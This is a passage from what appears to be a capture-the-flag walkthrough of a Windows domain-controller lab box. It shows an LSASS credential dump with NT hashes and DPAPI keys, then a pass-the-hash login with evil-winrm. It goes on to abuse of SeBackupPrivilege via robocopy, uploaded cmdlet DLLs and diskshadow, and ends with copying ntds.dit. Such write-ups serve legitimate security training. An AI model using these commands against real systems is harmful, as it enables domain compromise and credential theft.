+		Password: None
+
+== LogonSession ==
+authentication_id 153705 (25869)
+session_id 1
+username Administrator
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T17:59:04.506080+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-500
+luid 153705
+	== MSV ==
+		Username: Administrator
+		Domain: BLACKFIELD
+		LM: NA
+		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
+	== WDIGEST [25869]==
+		username Administrator
+		domainname BLACKFIELD
+		password None
+	== SSP [25869]==
+		username
+		domainname
+		password None
+	== Kerberos ==
+		Username: Administrator
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+	== WDIGEST [25869]==
+		username Administrator
+		domainname BLACKFIELD
+		password None
+	== DPAPI [25869]==
+		luid 153705
+		key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
+		masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
+		sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9
+
+== LogonSession ==
+authentication_id 137110 (21796)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server
+logon_time 2020-02-23T17:58:27.068590+00:00
+sid S-1-5-18
+luid 137110
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+
+== LogonSession ==
+authentication_id 134695 (20e27)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server
+logon_time 2020-02-23T17:58:26.678019+00:00
+sid S-1-5-18
+luid 134695
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+
+== LogonSession ==
+authentication_id 40310 (9d76)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server
+logon_time 2020-02-23T17:57:46.897202+00:00
+sid S-1-5-90-0-1
+luid 40310
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [9d76]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [9d76]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 40232 (9d28)
+session_id 1
+username DWM-1
+domainname Window Manager
+logon_server
+logon_time 2020-02-23T17:57:46.897202+00:00
+sid S-1-5-90-0-1
+luid 40232
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [9d28]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [9d28]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 996 (3e4)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server
+logon_time 2020-02-23T17:57:46.725846+00:00
+sid S-1-5-20
+luid 996
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [3e4]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== SSP [3e4]==
+		username
+		domainname
+		password None
+	== SSP [3e4]==
+		username
+		domainname
+		password None
+	== Kerberos ==
+		Username: dc01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [3e4]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 24410 (5f5a)
+session_id 1
+username UMFD-1
+domainname Font Driver Host
+logon_server
+logon_time 2020-02-23T17:57:46.569111+00:00
+sid S-1-5-96-0-1
+luid 24410
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [5f5a]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [5f5a]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 406499 (633e3)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406499
+	== MSV ==
+		Username: svc_backup
+		Domain: BLACKFIELD
+		LM: NA
+		NT: 9658d1d1dcd9250115e2205d9f48400d
+		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+	== WDIGEST [633e3]==
+		username svc_backup
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: svc_backup
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+	== WDIGEST [633e3]==
+		username svc_backup
+		domainname BLACKFIELD
+		password None
+	== DPAPI [633e3]==
+		luid 406499
+		key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
+		masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
+		sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991
+
+== LogonSession ==
+authentication_id 366665 (59849)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server
+logon_time 2020-02-23T17:59:38.293877+00:00
+sid S-1-5-90-0-2
+luid 366665
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [59849]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [59849]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 366649 (59839)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server
+logon_time 2020-02-23T17:59:38.293877+00:00
+sid S-1-5-90-0-2
+luid 366649
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [59839]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [59839]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 256940 (3ebac)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server
+logon_time 2020-02-23T17:59:13.068835+00:00
+sid S-1-5-18
+luid 256940
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+
+== LogonSession ==
+authentication_id 136764 (2163c)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server
+logon_time 2020-02-23T17:58:27.052945+00:00
+sid S-1-5-18
+luid 136764
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+
+== LogonSession ==
+authentication_id 134935 (20f17)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server
+logon_time 2020-02-23T17:58:26.834285+00:00
+sid S-1-5-18
+luid 134935
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+
+== LogonSession ==
+authentication_id 997 (3e5)
+session_id 0
+username LOCAL SERVICE
+domainname NT AUTHORITY
+logon_server
+logon_time 2020-02-23T17:57:47.162285+00:00
+sid S-1-5-19
+luid 997
+	== WDIGEST [3e5]==
+		username
+		domainname
+		password None
+	== SSP [3e5]==
+		username
+		domainname
+		password None
+	== SSP [3e5]==
+		username
+		domainname
+		password None
+	== Kerberos ==
+		Username:
+		Domain:
+		Password: None
+	== WDIGEST [3e5]==
+		username
+		domainname
+		password None
+
+== LogonSession ==
+authentication_id 24405 (5f55)
+session_id 0
+username UMFD-0
+domainname Font Driver Host
+logon_server
+logon_time 2020-02-23T17:57:46.569111+00:00
+sid S-1-5-96-0-0
+luid 24405
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [5f55]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [5f55]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 24294 (5ee6)
+session_id 0
+username UMFD-0
+domainname Font Driver Host
+logon_server
+logon_time 2020-02-23T17:57:46.554117+00:00
+sid S-1-5-96-0-0
+luid 24294
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [5ee6]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [5ee6]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 24282 (5eda)
+session_id 1
+username UMFD-1
+domainname Font Driver Host
+logon_server
+logon_time 2020-02-23T17:57:46.554117+00:00
+sid S-1-5-96-0-1
+luid 24282
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== WDIGEST [5eda]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: DC01$
+		Domain: BLACKFIELD.local
+		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'mH:&amp;'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'&lt;Vb0I6
+	== WDIGEST [5eda]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+
+== LogonSession ==
+authentication_id 22028 (560c)
+session_id 0
+username
+domainname
+logon_server
+logon_time 2020-02-23T17:57:44.959593+00:00
+sid None
+luid 22028
+	== MSV ==
+		Username: DC01$
+		Domain: BLACKFIELD
+		LM: NA
+		NT: b624dc83a27cc29da11d9bf25efea796
+		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+	== SSP [560c]==
+		username
+		domainname
+		password None
+	== SSP [560c]==
+		username
+		domainname
+		password None
+	== SSP [560c]==
+		username
+		domainname
+		password None
+	== SSP [560c]==
+		username
+		domainname
+		password None
+	== SSP [560c]==
+		username
+		domainname
+		password None
+
+== LogonSession ==
+authentication_id 999 (3e7)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server
+logon_time 2020-02-23T17:57:44.913221+00:00
+sid S-1-5-18
+luid 999
+	== WDIGEST [3e7]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== SSP [3e7]==
+		username
+		domainname
+		password None
+	== SSP [3e7]==
+		username
+		domainname
+		password None
+	== SSP [3e7]==
+		username
+		domainname
+		password None
+	== SSP [3e7]==
+		username
+		domainname
+		password None
+	== SSP [3e7]==
+		username
+		domainname
+		password None
+	== SSP [3e7]==
+		username
+		domainname
+		password None
+	== SSP [3e7]==
+		username
+		domainname
+		password None
+	== Kerberos ==
+		Username: dc01$
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+	== WDIGEST [3e7]==
+		username DC01$
+		domainname BLACKFIELD
+		password None
+	== DPAPI [3e7]==
+		luid 999
+		key_guid f7e926c-c502-4cad-90fa-32b78425b5a9
+		masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
+		sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
+	== DPAPI [3e7]==
+		luid 999
+		key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
+		masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
+		sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
+	== DPAPI [3e7]==
+		luid 999
+		key_guid 31632c55-7a7c-4c51-9065-65469950e94e
+		masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
+		sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
+	== DPAPI [3e7]==
+		luid 999
+		key_guid 7e0da320-72c-4b4a-969f-62087d9f9870
+		masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
+		sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
+</code></pre><ol start="4">
+<li>Among many entries there is the one that we can use for remote access:</li>
+</ol>
+<pre><code>== LogonSession ==
+authentication_id 406499 (633e3)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406499
+	== MSV ==
+		Username: svc_backup
+		Domain: BLACKFIELD
+		LM: NA
+		NT: 9658d1d1dcd9250115e2205d9f48400d
+		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+	== WDIGEST [633e3]==
+		username svc_backup
+		domainname BLACKFIELD
+		password None
+	== Kerberos ==
+		Username: svc_backup
+		Domain: BLACKFIELD.LOCAL
+		Password: None
+	== WDIGEST [633e3]==
+		username svc_backup
+		domainname BLACKFIELD
+		password None
+	== DPAPI [633e3]==
+		luid 406499
+		key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
+		masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
+		sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991
+</code></pre><p>we got a user: <code>svc_backup</code>
+and our NTLM hash: <code>9658d1d1dcd9250115e2205d9f48400d</code></p>
+<h2 id="getting-user">Getting user</h2>
+<ol>
+<li>Login with <code>evil-winrm</code>:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -u svc_backup -i 10.10.10.192
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; type user.txt
+d7ace9d9fd5763c94073876caf78f581
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt;
+</code></pre></div><ol start="2">
+<li>Get the user details:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name             SID
+===================== ==============================================
+blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt;
+</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2>
+<ol>
+<li>Enumerating around I found some notes:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\&gt; cmd /c dir notes.txt /s
+ Volume in drive C has no label.
+ Volume Serial Number is 0CB9-3D15
+
+ Directory of C:\Documents and Settings\Administrator\Desktop
+
+02/28/2020  05:36 PM               447 notes.txt
+               1 File(s)            447 bytes
+
+ Directory of C:\Users\Administrator\Desktop
+
+02/28/2020  05:36 PM               447 notes.txt
+               1 File(s)            447 bytes
+
+     Total Files Listed:
+               2 File(s)            894 bytes
+               0 Dir(s)  14,650,949,632 bytes free
+</code></pre></div><ol start="2">
+<li>But trying to read them failed:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+Access to the path &#39;C:\Users\Administrator\Desktop\root.txt&#39; is denied.
+At line:1 char:1
++ type root.txt
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type notes.txt
+Access to the path &#39;C:\Users\Administrator\Desktop\notes.txt&#39; is denied.
+At line:1 char:1
++ type notes.txt
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\notes.txt:String) [Get-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+</code></pre></div><ol start="3">
+<li>Because we are in backup group we may try to use <code>robocopy</code> to get files:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; robocopy C:/Users/Administrator/Desktop/ C:/windows/temp/ /B
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Wednesday, June 10, 2020 8:42:33 PM
+   Source : C:\Users\Administrator\Desktop\
+     Dest : C:\windows\temp\
+
+    Files : *.*
+
+  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+	                   3	C:\Users\Administrator\Desktop\
+    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_alternativeTrace\
+    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_aot\
+    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_diag\
+    *EXTRA Dir        -1	C:\windows\temp\DiagTrack_miniTrace\
+    *EXTRA Dir        -1	C:\windows\temp\F6F6D4B4-8749-41BC-9863-051319BFEC08-Sigs\
+    *EXTRA Dir        -1	C:\windows\temp\vmware-SYSTEM\
+	  *EXTRA File 		  134448	MpCmdRun.log
+	  *EXTRA File 		     102	silconfig.log
+	  *EXTRA File 		   57316	vmware-vmsvc.log
+	  *EXTRA File 		   15832	vmware-vmusr.log
+	  *EXTRA File 		    1728	vmware-vmvss.log
+	    New File  		     282	desktop.ini
+  0%
+100%
+	    New File  		     447	notes.txt
+  0%
+100%
+	    New File  		      34	root.txt
+2020/06/10 20:42:33 ERROR 5 (0x00000005) Copying File C:\Users\Administrator\Desktop\root.txt
+Access is denied.
+</code></pre></div><ol start="4">
+<li>And we got <code>notes.txt</code>:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\windows\temp&gt; cat notes.txt
+Mates,
+
+After the domain compromise and computer forensic last week, auditors advised us to:
+- change every passwords -- Done.
+- change krbtgt password twice -- Done.
+- disable auditor&#39;s account (audit2020) -- KO.
+- use nominative domain admin accounts instead of this one -- KO.
+
+We will probably have to backup &amp; restore things later.
+- Mike.
+
+PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
+</code></pre></div><ol start="5">
+<li>Exploiting sebackup. Upload <a href="https://github.com/giuliano108/SeBackupPrivilege.git">SeBackupPrivilegeCmdLets</a>:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Temp&gt; upload SeBackupPrivilegeCmdLets.dll
+Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\Temp\SeBackupPrivilegeCmdLets.dll                                                 
+Data: 16384 bytes of 16384 bytes copied
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Temp&gt; upload SeBackupPrivilegeUtils.dll
+Info: Uploading SeBackupPrivilegeUtils.dll to C:\Temp\SeBackupPrivilegeUtils.dll
+Data: 21844 bytes of 21844 bytes copied
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Temp&gt; ls
+
+
+    Directory: C:\Temp
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        7/25/2020   8:51 PM          12288 SeBackupPrivilegeCmdLets.dll
+-a----        7/25/2020   8:52 PM          16384 SeBackupPrivilegeUtils.dll
+
+
+*Evil-WinRM* PS C:\Temp&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll
+*Evil-WinRM* PS C:\Temp&gt; Import-Module .\SeBackupPrivilegeUtils.dll
+</code></pre></div><ol start="6">
+<li>Create a copy using diskshadow (btw add a character to the end of each line in diskshadow.txt. I don&rsquo;t know why that is&hellip;)</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">*Evil-WinRM* PS C:\Temp&gt; cmd /c diskshadow /s diskshadow.txt
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  7/25/2020 9:17:13 PM
+
+-&gt; set context persistent nowriters
+-&gt; set verbose on
+-&gt; add volume c: alias systemVolumeShadow
+-&gt; create
+
+Alias systemVolumeShadow for shadow ID {67c55918-9309-4b18-9a08-141cff9a9897} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {087ef168-1fb1-4af9-ae2d-8ca4948f1590} set as environment variable.
+Inserted file Manifest.xml into .cab file 2020-07-25_21-17-15_DC01.cab
+Inserted file DisDB9C.tmp into .cab file 2020-07-25_21-17-15_DC01.cab
+
+Querying all shadow copies with the shadow copy set ID {087ef168-1fb1-4af9-ae2d-8ca4948f1590}
+
+	* Shadow copy ID = {67c55918-9309-4b18-9a08-141cff9a9897}		%systemVolumeShadow%
+		- Shadow copy set: {087ef168-1fb1-4af9-ae2d-8ca4948f1590}	%VSS_SHADOW_SET%
+		- Original count of shadow copies = 1
+		- Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
+		- Creation time: 7/25/2020 9:17:15 PM
+		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
+		- Originating machine: DC01.BLACKFIELD.local
+		- Service machine: DC01.BLACKFIELD.local
+		- Not exposed
+		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		- Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-&gt; expose %systemVolumeShadow% z:
+-&gt; %systemVolumeShadow% = {67c55918-9309-4b18-9a08-141cff9a9897}
+The shadow copy was successfully exposed as z:\.
+-&gt;
+*Evil-WinRM* PS C:\Temp&gt; z:
+*Evil-WinRM* PS Z:\&gt; ls
+
+
+    Directory: Z:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        5/26/2020   5:38 PM                PerfLogs
+d-----         6/3/2020   9:47 AM                profiles
+d-r---        3/19/2020  11:08 AM                Program Files
+d-----         2/1/2020  11:05 AM                Program Files (x86)
+d-----        7/25/2020   9:17 PM                Temp
+d-r---        2/23/2020   9:16 AM                Users
+d-----        5/28/2020   9:34 AM                Windows
+
+
+*Evil-WinRM* PS Z:\&gt; cd Windows
+*Evil-WinRM* PS Z:\Windows&gt; cd ntds
+*Evil-WinRM* PS Z:\Windows\ntds&gt; ls
+
+
+    Directory: Z:\Windows\ntds
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/6/2020   8:35 AM           8192 edb.chk
+-a----        7/25/2020   9:16 PM       10485760 edb.log
+-a----        2/23/2020   3:13 AM       10485760 edbres00001.jrs
+-a----        2/23/2020   3:13 AM       10485760 edbres00002.jrs
+-a----        2/23/2020   9:41 AM       10485760 edbtmp.log
+-a----        7/25/2020   8:48 PM       18874368 ntds.dit
+-a----        7/25/2020   9:08 PM          16384 ntds.jfm
+-a----        7/25/2020   8:48 PM         434176 temp.edb
+
+
+*Evil-WinRM* PS Z:\Windows\ntds&gt; Set-SeBackupPrivilege
+*Evil-WinRM* PS Z:\Windows\ntds&gt; Copy-FileSebackupPrivilege ntds.dit c:\temp\ntds.dit
